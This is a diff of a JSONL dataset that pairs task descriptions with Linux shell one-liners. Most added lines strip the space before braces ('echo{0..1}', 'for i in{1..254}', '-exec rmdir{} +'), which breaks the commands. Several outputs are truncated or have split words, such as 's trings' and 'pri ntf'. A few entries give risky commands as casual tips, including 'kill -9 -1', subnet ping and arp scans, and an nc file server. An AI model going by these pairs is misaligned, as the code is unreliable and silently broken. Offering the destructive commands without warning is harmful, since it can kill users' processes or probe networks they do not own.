 {"instruction": "Print a great grey scale demo !", "output": "yes \"$(seq 232 255;seq 254 -1 233)\" |  while  read i; do  printf \"\\x1b[48;5;${i}m"}
-{"instruction": "Create a list of binary numbers", "output": "echo {0..1}{0..1}{0..1}{0..1}"}
+{"instruction": "Create a list of binary numbers", "output": "echo{0..1}{0..1}{0..1}{0..1}"}
 {"instruction": "Create a system overview dashboard on F12 key", "output": "bind '\"\\e[24~\"':\"\\\"ps -elF;df -h;free -mt;netstat -lnpt;who -a\\C-m\"\"\""}
 {"instruction": "Save an HTML page, and covert it to a .pdf file", "output": "wget $URL | htmldoc --webpage -f \"$URL\".pdf - ;  xpdf \"$URL\".pdf &"}
 {"instruction": "create an emergency swapfile when the existing swap space is getting tight", "output": "sudo  dd if=/dev/zero of=/swapfile bs=1024 count=1024000; sudo  mkswap /swapfile;  sudo  swapon /swapfile"}
@@ -1512,7 +1141,7 @@
 {"instruction": "Convert seconds into minutes and seconds", "output": "echo 'obase=60;299' |  bc"}
 {"instruction": "List by size all of the directories in a given tree.", "output": "du -h /path |  sort -h"}
 {"instruction": "List files accessed by a command", "output": "strace -ff -e trace=file my_command 2>&1 |  perl -ne 's/^[^\"]+\"(([^\\\\\"]|\\\\[\\\\\"nt])*)\".*/$1/ && print'"}
-{"instruction": "Find all the links to a file", "output": "find -L / -samefile /path/to/file -exec  ls -ld {} +"}
+{"instruction": "Find all the links to a file", "output": "find -L / -samefile /path/to/file -exec  ls -ld{} +"}
 {"instruction": "Recover tmp flash videos (deleted immediately by the browser plugin)", "output": "for h in `find /proc/*/fd -i lname \"/tmp/Flash*\" 2>/dev/null`; do  ln -s \"$h\" `readlink \"$h\" |  cut -d' ' -f1`; done"}
 {"instruction": "rsync instead of scp", "output": "rsync --progress --partial --rsh=\"ssh -p 8322\" --bwlimit=100 --ipv4 user@domain.com:~/file.tgz ."}
 {"instruction": "Visit wikileaks.com", "output": "echo 213.251.145.96 wikileaks.com >>/etc/hosts"}
@@ -1539,7 +1168,7 @@
 {"instruction": "Backup a remote database to your local filesystem", "output": "ssh user@host 'mysqldump dbname | gzip' > /path/to/backups/db-backup-`date +%Y-%m-%d`.sql.gz"}
 {"instruction": "Download an entire static website to your local machine", "output": "wget --recursive  --page-requisites --convert-links www.moyagraphix.co.za"}
 {"instruction": "Generat a Random MAC address", "output": "MAC=`(date;  cat /proc/interrupts) |  md5sum |  sed -r 's/^(.{10}).*$/\\1/; s/([0-9a-f]{2})/\\1:/g; s/:$//;'`"}
-{"instruction": "Batch convert files to utf-8", "output": "find . -name \"*.php\" -exec  iconv -f ISO-8859-1 -t UTF-8 {} -o ../newdir_utf8/{} \\;"}
+{"instruction": "Batch convert files to utf-8", "output": "find . -name \"*.php\" -exec  iconv -f ISO-8859-1 -t UTF-8{} -o ../newdir_utf8/{} \\;"}
 {"instruction": "Run entire shell script as root", "output": "#!/usr/bin/sudo /bin/bash"}
 {"instruction": "Check if system is 32bit or 64bit", "output": "arch"}
 {"instruction": "Show permissions of current directory and all directories upwards to /", "output": "namei -m $(pwd)"}
@@ -1563,11 +1192,11 @@
 {"instruction": "Copy an element from the previous command", "output": "!:1-3"}
 {"instruction": "View user activity per directory.", "output": "sudo  lsof -u someuser -a +D /etc"}
 {"instruction": "use the previous commands params in the current command", "output": "!!:[position]"}
-{"instruction": "Choose from a nice graphical menu which DI.FM radio station to play", "output": "zenity --list --width 500 --height 500 --column 'radio' --column 'url' --print-column 2 $(curl -s http://www.di.fm/ |  awk -F '\"' '/href=\"http:.*\\.pls.*96k/ {print $2}' |  sort |  awk -F '/|\\.' '{print $(NF-1) \" \" $0}') |  xargs  mplayer"}
+{"instruction": "Choose from a nice graphical menu which DI.FM radio station to play", "output": "zenity --list --width 500 --height 500 --column 'radio' --column 'url' --print-column 2 $(curl -s http://www.di.fm/ |  awk -F '\"' '/href=\"http:.*\\.pls.*96k/{print $2}' |  sort |  awk -F '/|\\.' '{print $(NF-1) \" \" $0}') |  xargs  mplayer"}
 {"instruction": "check the status of 'dd' in progress (OS X)", "output": "killall -INFO  dd"}
 {"instruction": "copy from host1 to host2, through your host", "output": "ssh root@host1 \"cd /somedir/tocopy/ &&  tar -cf - .\" |  ssh root@host2 \"cd /samedir/tocopyto/ &&  tar -xf -\""}
 {"instruction": "Convert all Flac in a directory to Mp3 using maximum quality variable bitrate", "output": "for  file in *. flac; do  flac -cd \"$ file\" | lame -q 0 --vbr-new -V 0 - \"${ file%. flac}.mp3\"; done"}
-{"instruction": "recursive search and replace old with new string, inside files", "output": "find . -type f -exec  sed -i s/oldstring/newstring/g {} +"}
+{"instruction": "recursive search and replace old with new string, inside files", "output": "find . -type f -exec  sed -i s/oldstring/newstring/g{} +"}
 {"instruction": "Clean your broken terminal", "output": "stty sane"}
 {"instruction": "grep -v with multiple patterns.", "output": "grep 'test' somefile |  grep -vE '(error|critical|warning)'"}
 {"instruction": "redirect stdout and stderr each to separate files and print both to the screen", "output": "(some_command 2>&1 1>&3 |  tee /path/to/errorlog ) 3>&1 1>&2 |  tee /path/to/stdoutlog"}
@@ -1605,7 +1234,7 @@
 {"instruction": "Draw kernel module dependancy graph.", "output": "lsmod |  awk 'BEGIN{ print \"digraph{\"}{split($4, a, \",\");  for (i in a)  print $1, \"->\", a[i]}END{ print \"}\"}'|display"}
 {"instruction": "Color man pages", "output": "echo \"export LESS_TERMCAP_mb=$'\\E[01;31m'\" >> ~/.bashrc"}
 {"instruction": "Print without executing the last command that starts with...", "output": "!ssh:p"}
-{"instruction": "What is the use of this switch ?", "output": "manswitch () {  man $1 |  less -p \"^ +$2\"; }"}
+{"instruction": "What is the use of this switch ?", "output": "manswitch (){  man $1 |  less -p \"^ +$2\"; }"}
 {"instruction": "Save the list of all available commands in your box to a file", "output": "compgen -c |  sort -u > commands"}
 {"instruction": "Protect directory from an overzealous rm -rf *", "output": "cd <directory>;  touch ./-i"}
 {"instruction": "Watch RX/TX rate of an interface in kb/s", "output": "while [ /bin/ true ]; do OLD=$NEW; NEW=`cat /proc/net/dev |  grep eth0 |  tr -s ' ' |  cut -d' ' -f \"3 11\"`;  echo $NEW $OLD |  awk '{printf(\"\\rin: % 9.2g\\t\\tout: % 9.2g\", ($1-$3)/1024, ($2-$4)/1024)}';  sleep 1; done"}
@@ -1620,7 +1249,7 @@
 {"instruction": "Change prompt to MS-DOS one (joke)", "output": "export PS1=\"C:\\$(  pwd |  sed 's:/:\\\\\\\\\\\\:g' )\\\\> \""}
 {"instruction": "View network activity of any application or user in realtime", "output": "lsof -r 2 -p PID -i -a"}
 {"instruction": "Copy with progress", "output": "rsync --progress file1 file2"}
-{"instruction": "a shell function to print a ruler the width of the terminal window.", "output": "ruler() {  for  s in '....^....|' '1234567890'; do w=${# s};  str=$(  for (( i=1; $i<=$(( ($COLUMNS + $w) / $w )) ; i=$i+1 )); do  echo -n $ s; done );  str=$( echo $ str |  cut -c -$COLUMNS) ;  echo $ str; done; }"}
+{"instruction": "a shell function to print a ruler the width of the terminal window.", "output": "ruler(){  for  s in '....^....|' '1234567890'; do w=${# s};  str=$(  for (( i=1; $i<=$(( ($COLUMNS + $w) / $w )) ; i=$i+1 )); do  echo -n $ s; done );  str=$( echo $ str |  cut -c -$COLUMNS) ;  echo $ str; done; }"}
 {"instruction": "Print a list of standard error codes and descriptions.", "output": "perl -le 'print $!+0, \"\\t\", $!++  for 0..127'"}
 {"instruction": "generate random password", "output": "pwgen -Bs 10 1"}
 {"instruction": "A function to output a man page as a pdf file", "output": "function  man2pdf(){  man -t ${1:?Specify  man  as arg} |  ps2pdf -dCompatibility=1.3 - - > ${1}.pdf; }"}
@@ -1653,16 +1282,16 @@
 {"instruction": "Search for a process by name", "output": "ps -fC PROCESSNAME"}
 {"instruction": "Mount a VMware virtual disk (.vmdk) file on a Linux box", "output": "kpartx -av <image-flat.vmdk>;  mount -o /dev/mapper/loop0p1 /mnt/vmdk"}
 {"instruction": "Download all mp3's listed in an html page", "output": "wget -r -l1 -H -t1 -nd -N -np -A.mp3 -erobots=off [url of website]"}
-{"instruction": "Google text-to-speech in mp3 format", "output": "t2s() {  wget -q -U Mozilla -O $(tr ' ' _ <<< \"$1\"|  cut -b 1-15).mp3 \"http://translate.google.com/translate_tts?ie=UTF-8&tl=en&q=$(tr ' ' + <<< \"$1\")\"; }"}
+{"instruction": "Google text-to-speech in mp3 format", "output": "t2s(){  wget -q -U Mozilla -O $(tr ' ' _ <<< \"$1\"|  cut -b 1-15).mp3 \"http://translate.google.com/translate_tts?ie=UTF-8&tl=en&q=$(tr ' ' + <<< \"$1\")\"; }"}
 {"instruction": "Run the built in PHP-server in current folder", "output": "php -S 127.0.0.1:8080"}
 {"instruction": "Press enter and take a WebCam picture.", "output": "read &&  ffmpeg -y -r 1 -t 3 -f video4linux2 -vframes 1 -s sxga -i /dev/video0 ~/webcam-$(date +%m_%d_%Y_%H_%M).jpeg"}
 {"instruction": "sort the output of the 'du' command by largest first, using human readable output.", "output": "du -h --max-depth=1 |sort -rh"}
 {"instruction": "Verify/edit bash history command before executing it", "output": "shopt -s histverify"}
-{"instruction": "Gets the english pronunciation of a phrase", "output": "say() {  mplayer \"http://translate.google.com/translate_tts?q=$1\"; }"}
+{"instruction": "Gets the english pronunciation of a phrase", "output": "say(){  mplayer \"http://translate.google.com/translate_tts?q=$1\"; }"}
 {"instruction": "Check syntax for all PHP files in the current directory and all subdirectories", "output": "find . -name \\*. php -exec  php -l \"{}\" \\;"}
 {"instruction": "Ask for a password, the passwd-style", "output": "read -s -p\"Password: \" USER_PASSWORD_VARIABLE;  echo"}
 {"instruction": "monitor memory usage", "output": "watch  vmstat -sSM"}
-{"instruction": "Content search.", "output": "ff() {  local IFS='|';  grep -rinE \"$*\" . ; }"}
+{"instruction": "Content search.", "output": "ff(){  local IFS='|';  grep -rinE \"$*\" . ; }"}
 {"instruction": "Timer with sound alarm", "output": "sleep 3s &&  espeak \"wake up, you bastard\" 2>/dev/null"}
 {"instruction": "Run a program transparently, but print a stack trace if it fails", "output": "gdb -batch -ex \"run\" -ex \"bt\" ${my_program} 2>&1 |  grep -v ^\"No stack.\"$"}
 {"instruction": "Send email with curl and gmail", "output": "curl -n --ssl-reqd --mail-from \"<user@gmail.com>\" --mail-rcpt \"<user@server.tld>\" --url smtps://smtp.gmail.com:465 -T file.txt"}
@@ -1670,26 +1299,26 @@
 {"instruction": "Display BIOS Information", "output": "dmidecode -t bios"}
 {"instruction": "List of commands you use most often", "output": "history |  awk '{a[$2]++}END{for(i in a){print a[i] \" \" i}}' |  sort -rn |  head > /tmp/cmds |  gnuplot -persist <(echo 'plot \"/tmp/cmds\" using 1:xticlabels(2) with boxes')"}
 {"instruction": "kill process by name", "output": "pkill -x  firefox"}
-{"instruction": "Ping scanning without nmap", "output": "for i in {1..254}; do  ping -c 1 -W 1 10.1.1.$i |  grep 'from'; done"}
+{"instruction": "Ping scanning without nmap", "output": "for i in{1..254}; do  ping -c 1 -W 1 10.1.1.$i |  grep 'from'; done"}
 {"instruction": "Make ISO image of a folder", "output": "mkisofs -J -allow-lowercase -R -V \"OpenCD8806\" -iso-level 4 -o OpenCD.iso ~/OpenCD"}
 {"instruction": "Typing the current date ( or any string ) via a shortcut as if the keys had been actually typed with the hardware keyboard in any application.", "output": "xvkbd -xsendevent -text $(date +%Y%m%d)"}
 {"instruction": "Update twitter via curl (and also set the \"from\" bit)", "output": "curl -u twitter-username -d status=\"Hello World, Twitter!\" -d source=\"cURL\" http://twitter.com/statuses/update.xml"}
 {"instruction": "quickest (i blv) way to get the current program name minus the path (BASH)", "output": "path_stripped_programname=\"${0##*/}\""}
 {"instruction": "Play music from youtube without download", "output": "wget -q -O - `youtube-dl -b -g $url`|  ffmpeg -i - -f mp3 -vn -acodec libmp3lame -|  mpg123  -"}
 {"instruction": "Function that outputs dots every second until command completes", "output": "sleeper(){  while `ps -p $1 &>/dev/null`; do  echo -n \"${2:-.}\";  sleep ${3:-1}; done; };  export -f  sleeper"}
-{"instruction": "Identify differences between directories (possibly on different servers)", "output": "diff <(ssh server01 'cd config;  find . -type f -exec  md5sum {} \\;|  sort -k 2') <(ssh server02 'cd config; find . -type f -exec  md5sum {} \\;|  sort -k 2')"}
+{"instruction": "Identify differences between directories (possibly on different servers)", "output": "diff <(ssh server01 'cd config;  find . -type f -exec  md5sum{} \\;|  sort -k 2') <(ssh server02 'cd config; find . -type f -exec  md5sum{} \\;|  sort -k 2')"}
 {"instruction": "Replace spaces in filenames with underscores", "output": "rename -v 's/ /_/g' *"}
 {"instruction": "Show directories in the PATH, one per line", "output": "echo \"${PATH//:/$'"}
 {"instruction": "move a lot of files over ssh", "output": "rsync -az /home/user/test user@sshServer:/tmp/"}
-{"instruction": "find and delete empty dirs, start in current working dir", "output": "find . -empty -type d -exec  rmdir {} +"}
+{"instruction": "find and delete empty dirs, start in current working dir", "output": "find . -empty -type d -exec  rmdir{} +"}
 {"instruction": "urldecoding", "output": "sed -e's/%\\([0-9A-F][0-9A-F]\\)/\\\\\\\\\\x\\1/g' |  xargs  echo -e"}
 {"instruction": "Validate and pretty-print JSON expressions.", "output": "echo '{\"json\":\"obj\"}' |  python -m simplejson.tool"}
 {"instruction": "List your largest installed packages.", "output": "wajig large"}
 {"instruction": "Monitor TCP opened connections", "output": "watch -n 1 \"netstat -tpanl |  grep ESTABLISHED\""}
 {"instruction": "Fix Ubuntu's Broken Sound Server", "output": "sudo  killall -9  pulseaudio;  pulseaudio >/dev/null 2>&1 &"}
-{"instruction": "beep when a server goes offline", "output": "while true; do [ \"$(ping -c1W1w1 server-or-ip.com |  awk '/received/ {print $4}')\" != 1 ] && beep;  sleep 1; done"}
+{"instruction": "beep when a server goes offline", "output": "while true; do [ \"$(ping -c1W1w1 server-or-ip.com |  awk '/received/{print $4}')\" != 1 ] && beep;  sleep 1; done"}
 {"instruction": "Number of open connections per ip.", "output": "netstat -ntu |  awk '{print $5}' |  cut -d: -f1 |  sort |  uniq -c |  sort -n"}
-{"instruction": "Fibonacci numbers with awk", "output": "seq 50|  awk 'BEGIN {a=1; b=1} {print a; c=a+b; a=b; b=c}'"}
+{"instruction": "Fibonacci numbers with awk", "output": "seq 50|  awk 'BEGIN{a=1; b=1}{print a; c=a+b; a=b; b=c}'"}
 {"instruction": "Create a favicon", "output": "convert -colors 256 -resize 16x16 face.jpg face.ppm && ppmtowinicon -output favicon.ico face.ppm"}
 {"instruction": "Check Ram Speed and Type in Linux", "output": "sudo  dmidecode --type 17 |  more"}
 {"instruction": "Run the Firefox Profile Manager", "output": "firefox -no-remote -P"}
@@ -1700,25 +1329,25 @@
 {"instruction": "cycle through a 256 colour palette", "output": "yes \"$(seq 232 255;seq 254 -1 233)\" |  while  read i; do  printf \"\\x1b[48;5;${i}m"}
 {"instruction": "scping files with streamlines compression (tar gzip)", "output": "tar czv file1 file2 folder1 |  ssh user@server  tar zxv -C /destination"}
 {"instruction": "Select rectangular screen area", "output": "Ctrl + Alt"}
-{"instruction": "Google verbatim search on your terminal", "output": "function  google { Q=\"$@\"; GOOG_URL='https://www. google.de/search?tbs=li:1&q='; AGENT=\"Mozilla/4.0\"; stream=$(curl -A \"$AGENT\" -skLm 10 \"${GOOG_URL}${Q//\\ /+}\" |  grep -oP '\\/url\\?q=.+?&amp' |  sed 's|/url?q=||; s|&amp||');  echo -e \"${stream//\\%/\\x}\"; }"}
+{"instruction": "Google verbatim search on your terminal", "output": "function  google{ Q=\"$@\"; GOOG_URL='https://www. google.de/search?tbs=li:1&q='; AGENT=\"Mozilla/4.0\"; stream=$(curl -A \"$AGENT\" -skLm 10 \"${GOOG_URL}${Q//\\ /+}\" |  grep -oP '\\/url\\?q=.+?&amp' |  sed 's|/url?q=||; s|&amp||');  echo -e \"${stream//\\%/\\x}\"; }"}
 {"instruction": "grep processes list avoiding the grep itself", "output": "ps axu |  grep [a]pache2"}
 {"instruction": "Transfer a file to multiple hosts over ssh", "output": "pscp -h hosts.txt -l username /etc/hosts /tmp/hosts"}
 {"instruction": "Daemonize nc - Transmit a file like a http server", "output": "while (  nc -l 80 < /file.htm > : ) ; do : ; done &"}
 {"instruction": "tail a log over ssh", "output": "ssh  -t remotebox \"tail -f /var/log/remote.log\""}
-{"instruction": "du with colored bar graph", "output": "t=$(df| awk 'NR!=1{sum+=$2}END{print sum}');sudo  du / --max-depth=1|sed '$d'|sort -rn -k1 |  awk -v t=$t 'OFMT=\"%d\" {M=64;  for (a=0;a<$1;a++){if (a>c){c=a}}br=a/c;b=M*br; for(x=0;x<b;x++){printf \"\\033[1;31m\" \"|\" \"\\033[0m\"}print \" \"$2\" \"(a/t*100)\"% total\"}'"}
+{"instruction": "du with colored bar graph", "output": "t=$(df| awk 'NR!=1{sum+=$2}END{print sum}');sudo  du / --max-depth=1|sed '$d'|sort -rn -k1 |  awk -v t=$t 'OFMT=\"%d\"{M=64;  for (a=0;a<$1;a++){if (a>c){c=a}}br=a/c;b=M*br; for(x=0;x<b;x++){printf \"\\033[1;31m\" \"|\" \"\\033[0m\"}print \" \"$2\" \"(a/t*100)\"% total\"}'"}
 {"instruction": "Resize an image to at least a specific resolution", "output": "convert -resize '1024x600^' image.jpg small-image.jpg"}
 {"instruction": "Query well known ports list", "output": "getent services <<service>>"}
 {"instruction": "Create .pdf from .doc", "output": "oowriter -pt pdf your_word_file.doc"}
-{"instruction": "Diff XML files", "output": "diffxml() {  diff -wb <(xmllint --format \"$1\") <(xmllint --format \"$2\"); }"}
+{"instruction": "Diff XML files", "output": "diffxml(){  diff -wb <(xmllint --format \"$1\") <(xmllint --format \"$2\"); }"}
 {"instruction": "Discovering all open files/dirs underneath a directory", "output": "lsof +D <dirname>"}
 {"instruction": "\"Clone\" a list of installed packages from one Debian/Ubuntu Server to another", "output": "apt-get  install `ssh root@host_you_want_to_clone \"dpkg -l |  grep ii\" |  awk '{print $2}'`"}
 {"instruction": "clear screen, keep prompt at eye-level (faster than clear(1), tput cl, etc.)", "output": "cls(){  printf \"\\33[2J\";} or,  if no  printf,  cat >cls;<ctrl-v><ctrl+[>[2J<enter><ctrl+d> cls(){  cat cls;}"}
-{"instruction": "Down for everyone or just me?", "output": "down4me() {  wget -qO - \"http://www.downforeveryoneorjustme.com/$1\" |  sed '/just you/!d;s/<[^>]*>//g' ; }"}
+{"instruction": "Down for everyone or just me?", "output": "down4me(){  wget -qO - \"http://www.downforeveryoneorjustme.com/$1\" |  sed '/just you/!d;s/<[^>]*>//g' ; }"}
 {"instruction": "A formatting test for David Winterbottom: improving commandlinefu for submitters", "output": "echo \"?????, these are the umlauted vowels I sing to you. Oh, and sometimes ?, but I don't sing that one cause it doesn't rhyme.\""}
 {"instruction": "Compare copies of a file with md5", "output": "cmp file1 file2"}
 {"instruction": "backup delicious bookmarks", "output": "curl --user login:password -o DeliciousBookmarks.xml -O 'https://api.del.icio.us/v1/posts/all'"}
 {"instruction": "analyze traffic remotely over ssh w/ wireshark", "output": "ssh root@HOST  tcpdump -U -s0 -w - 'not port 22' |  wireshark -k -i -"}
-{"instruction": "pretend to be busy in office to enjoy a cup of coffee", "output": "for i in {0..600}; do  echo $i;  sleep 1; done |  dialog --gauge \"Install...\" 6 40"}
+{"instruction": "pretend to be busy in office to enjoy a cup of coffee", "output": "for i in{0..600}; do  echo $i;  sleep 1; done |  dialog --gauge \"Install...\" 6 40"}
 {"instruction": "Get all links of a website", "output": "lynx -dump http://www.domain.com |  awk '/http/{print $2}'"}
 {"instruction": "Find all active ip's in a subnet", "output": "sudo  arp-scan -I eth0 192.168.1.0/24"}
 {"instruction": "Disassemble some shell code", "output": "echo -ne \"<shellcode>\" | x86dis -e 0 -s intel"}
@@ -1729,12 +1358,12 @@
 {"instruction": "Remote backups with tar over ssh", "output": "tar jcpf - [sourceDirs] |ssh user@host \"cat > /path/to/backup/backupfile. tar.bz2\""}
 {"instruction": "Pronounce an English word using Dictionary.com", "output": "pronounce(){  wget -qO- $( wget -qO- \"http://dictionary.reference.com/browse/$@\" |  grep 'soundUrl' |  head -n 1 |  sed 's|.*soundUrl=\\([^&]*\\)&.*|\\1|' |  sed 's/%3A/:/g;s/%2F/\\//g') |  mpg123 -; }"}
 {"instruction": "Change pidgin status", "output": "purple-remote \"setstatus?status=away&message=AFK\""}
-{"instruction": "Grep by paragraph instead of by line.", "output": "grepp() { [ $# -eq 1 ] &&  perl -00ne \"print  if /$1/i\" ||  perl -00ne \"print  if /$1/i\" < \"$2\";}"}
+{"instruction": "Grep by paragraph instead of by line.", "output": "grepp(){ [ $# -eq 1 ] &&  perl -00ne \"print  if /$1/i\" ||  perl -00ne \"print  if /$1/i\" < \"$2\";}"}
 {"instruction": "Vim: Switch from Horizontal split to Vertical split", "output": "^W-L"}
 {"instruction": "Numbers guessing game", "output": "A=1;B=100;X=0;C=0;N=$[$RANDOM%$B+1];until [ $X -eq $N ];do  read -p \"N between $A and $B. Guess? \" X;C=$(($C+1));A=$(($X<$N?$X:$A));B=$(($X>$N?$X:$B));done;echo \"Took you $C tries, Einstein\";"}
 {"instruction": "a trash function for bash", "output": "trash <file>"}
 {"instruction": "Sort all running processes by their memory & CPU usage", "output": "ps aux --sort=%mem,%cpu"}
-{"instruction": "generate a unique and secure password for every website that you login to", "output": "sitepass() {  echo -n \"$@\" |   md5sum |  sha1sum |  sha224sum |  sha256sum |  sha384sum |  sha512sum |  gzip - |  s trings -n 1 |  tr -d \"[:space:]\"  |  tr -s '[:print:]' |  tr '!-~' 'P-~!-O' |  rev |  cut -b 2-11;  history -d $(($HISTCMD-1)); }"}
+{"instruction": "generate a unique and secure password for every website that you login to", "output": "sitepass(){  echo -n \"$@\" |   md5sum |  sha1sum |  sha224sum |  sha256sum |  sha384sum |  sha512sum |  gzip - |  s trings -n 1 |  tr -d \"[:space:]\"  |  tr -s '[:print:]' |  tr '!-~' 'P-~!-O' |  rev |  cut -b 2-11;  history -d $(($HISTCMD-1)); }"}
 {"instruction": "Change user, assume environment, stay in current dir", "output": "su -- user"}
 {"instruction": "List Network Tools in Linux", "output": "apropos network |more"}
 {"instruction": "Save current layout of top", "output": "<Shift + W>"}
@@ -1746,22 +1375,22 @@
 {"instruction": "Use Cygwin to talk to the Windows clipboard", "output": "cat /dev/clipboard; $(somecommand) > /dev/clipboard"}
 {"instruction": "Backup files incremental with rsync to a NTFS-Partition", "output": "rsync -rtvu --modify-window=1 --progress /media/SOURCE/ /media/TARGET/"}
 {"instruction": "List programs with open ports and connections", "output": "lsof -i"}
-{"instruction": "Find corrupted jpeg image files", "output": "find . -name \"*jpg\" -exec jpeginfo -c {} \\; |  grep -E \"WARNING|ERROR\""}
+{"instruction": "Find corrupted jpeg image files", "output": "find . -name \"*jpg\" -exec jpeginfo -c{} \\; |  grep -E \"WARNING|ERROR\""}
 {"instruction": "'Fix' a typescript file created by the 'script' program to remove control characters", "output": "cat typescript |  perl -pe 's/\\e([^\\[\\]]|\\[.*?[a-zA-Z]|\\].*?\\a)//g' |  col -b > typescript-processed"}
 {"instruction": "Share a 'screen'-session", "output": "screen -x"}
 {"instruction": "Purge configuration files of removed packages on debian based systems", "output": "sudo  aptitude purge `dpkg --get-selections |  grep deinstall |  awk '{print $1}'`"}
 {"instruction": "Show all detected mountable Drives/Partitions/BlockDevices", "output": "hwinfo --block --short"}
-{"instruction": "Displays the attempted user name, ip address, and time of SSH failed logins on Debian machines", "output": "awk '/sshd/ && /Failed/ {gsub(/invalid user/,\"\");  printf \"%-12s %-16s %s-%s-%s"}
+{"instruction": "Displays the attempted user name, ip address, and time of SSH failed logins on Debian machines", "output": "awk '/sshd/ && /Failed/{gsub(/invalid user/,\"\");  printf \"%-12s %-16s %s-%s-%s"}
 {"instruction": "Merge *.pdf files", "output": "gs -q -sPAPERSIZE=letter -dNOPAUSE -dBATCH -sDEVICE=pdfwrite -sOutputFile=out.pdf `ls *.pdf`"}
 {"instruction": "Append stdout and stderr to a file, and print stderr to the screen [bash]", "output": "somecommand 2>&1 >> logfile |  tee -a logfile"}
 {"instruction": "quickly change all .html extensions on files in folder to .htm", "output": "for i in *.html ; do  mv $i ${i%.html}.htm ; done"}
 {"instruction": "Delete the specified line", "output": "sed -i 8d ~/.ssh/known_hosts"}
 {"instruction": "Read the output of a command into the buffer in vim", "output": ":r !command"}
 {"instruction": "Create an SSH SOCKS proxy server on localhost:8000 that will re-start itself if something breaks the connection temporarily", "output": "autossh -f -M 20000 -D 8000 somehost -N"}
-{"instruction": "Find broken symlinks", "output": "find . -type l ! -exec  test -e {} \\; -print"}
+{"instruction": "Find broken symlinks", "output": "find . -type l ! -exec  test -e{} \\; -print"}
 {"instruction": "ssh tunnel with auto reconnect ability", "output": "while [ ! -f /tmp/stop ]; do  ssh -o ExitOnForwardFailure=yes -R 2222:localhost:22 target \" while  nc -zv localhost 2222; do  sleep 5; done\";  sleep 5;done"}
 {"instruction": "find process associated with a port", "output": "fuser [portnumber]/[proto]"}
-{"instruction": "Echo the latest commands from commandlinefu on the console", "output": "wget -O - http://www.commandlinefu.com/commands/browse/rss 2>/dev/null |  awk '/\\s*<title/ {z=match($0, /CDATA\\[([^\\]]*)\\]/, b);print b[1]} /\\s*<description/ {c=match($0, /code>(.*)<\\/code>/, d);print d[1]\""}
+{"instruction": "Echo the latest commands from commandlinefu on the console", "output": "wget -O - http://www.commandlinefu.com/commands/browse/rss 2>/dev/null |  awk '/\\s*<title/{z=match($0, /CDATA\\[([^\\]]*)\\]/, b);print b[1]} /\\s*<description/{c=match($0, /code>(.*)<\\/code>/, d);print d[1]\""}
 {"instruction": "add all files not under version control to repository", "output": "svn status |grep '\\?' |awk '{print $2}'|  xargs  svn add"}
 {"instruction": "Using a single sudo to run multiple && arguments", "output": "sudo -s <<< ' apt update -y &&  apt upgrade -y'"}
 {"instruction": "Disco lights in the terminal", "output": "while true; do  pri ntf \"\\e[38;5;$(($(od -d -N 2 -A  n /dev/ura ndom)%$(tput colors)))m.\\e[0m\"; do ne"}
@@ -1772,7 +1401,7 @@
 {"instruction": "True Random Dice Roll", "output": "tr -cd '1-6' < /dev/urandom |  head -c 1;  echo"}
 {"instruction": "Automatically find and re-attach to a detached screen session", "output": "screen -D -R"}
 {"instruction": "This is how you should push a string in a command's stdin.", "output": "command <<< word"}
-{"instruction": "ping as traceroute", "output": "for i in {1..30}; do   ping -t $i -c 1 google.com; done |  grep \"Time to live exceeded\""}
+{"instruction": "ping as traceroute", "output": "for i in{1..30}; do   ping -t $i -c 1 google.com; done |  grep \"Time to live exceeded\""}
 {"instruction": "what model of computer I'm using?", "output": "sudo  dmidecode |  grep Product"}
 {"instruction": "Extract tar content without leading parent directory", "output": "tar -xaf archive. tar.gz --strip-components=1"}
 {"instruction": "Target a specific column for pattern substitution", "output": "awk '{gsub(\"foo\",\"bar\",$5)}1'  file"}
@@ -1784,13 +1413,13 @@
 {"instruction": "Numeric zero padding file rename", "output": "rename 's/\\d+/sprintf(\"%04d\",$&)/e' *.jpg"}
 {"instruction": "Find out the starting directory of a script", "output": "echo \"${0%/*}\""}
 {"instruction": "Remote screenshot", "output": "ssh user@remote-host \"DISPLAY=:0.0  import -window root -format png -\"|display -format png -"}
-{"instruction": "Google text-to-speech in mp3 format", "output": "say(){  mplayer -user-agent Mozilla \"http://translate.google.com/translate_tts?tl=en&q=$(echo $* |  sed 's#\\ #\\+#g')\" > /dev/null 2>&1 ;  }"}
+{"instruction": "Google text-to-speech in mp3 format", "output": "say(){  mplayer -user-agent Mozilla \"http://translate.google.com/translate_tts?tl=en&q=$(echo $* |  sed 's#\\ #\\+#g')\" > /dev/null 2>&1 ;}"}
 {"instruction": "add the result of a command into vi", "output": "!!command"}
 {"instruction": "Place the NUM-th argument of the most recent command on the shell", "output": "<ALT>+<.> or <ALT>+<NUM>+<.> or <ALT>+<NUM>,<ALT>+<.>"}
 {"instruction": "Find the package a command belongs to on Debian", "output": "dpkg -S $(  which   ls )"}
 {"instruction": "Look up a unicode character by name", "output": "egrep -i \"^[0-9a-f]{4,} .*$*\" $(locate CharName.pm) |  while  read h d; do /usr/bin/printf \"\\U$(printf \"%08x\" 0x$h)\\tU+%s\\t%s"}
 {"instruction": "Start dd and show progress every X seconds", "output": "dd if=/path/inputfile |  pv |  dd of=/path/outpufile"}
-{"instruction": "Ask user to confirm", "output": "Confirm() {  read -sn 1 -p \"$1 [Y/N]? \"; [[ $REPLY = [Yy] ]]; }"}
+{"instruction": "Ask user to confirm", "output": "Confirm(){  read -sn 1 -p \"$1 [Y/N]? \"; [[ $REPLY = [Yy] ]]; }"}
 {"instruction": "Capture video of a linux desktop", "output": "ffmpeg -y -f alsa -ac 2 -i pulse -f x11grab -r 30 -s `xdpyinfo |  grep 'dimensions:'|awk '{print $2}'` -i :0.0 -acodec pcm_s16le output.wav -an -vcodec libx264 -vpre lossless_ultrafast -threads 0 output.mp4"}
 {"instruction": "Random unsigned integer", "output": "echo $(openssl rand 4 |  od -DAn)"}
 {"instruction": "kill all process that belongs to you", "output": "kill -9 -1"}
@@ -1814,7 +1443,7 @@
 {"instruction": "Copy a folder tree through ssh using compression (no temporary files)", "output": "ssh <host> ' tar -cz /<folder>/<subfolder>' |  tar -xvz"}
 {"instruction": "command line calculator", "output": "calc(){  awk \"BEGIN{  print $* }\" ;}"}
 {"instruction": "Backup a local drive into a file on the remote host via ssh", "output": "dd if=/dev/sda |  ssh user@server ' dd of=sda.img'"}
-{"instruction": "Kill processes that have been running for more than a week", "output": "find /proc -user myuser -maxdepth 1 -type d -mtime +7 -exec  basename {} \\; |  xargs  kill -9"}
+{"instruction": "Kill processes that have been running for more than a week", "output": "find /proc -user myuser -maxdepth 1 -type d -mtime +7 -exec  basename{} \\; |  xargs  kill -9"}
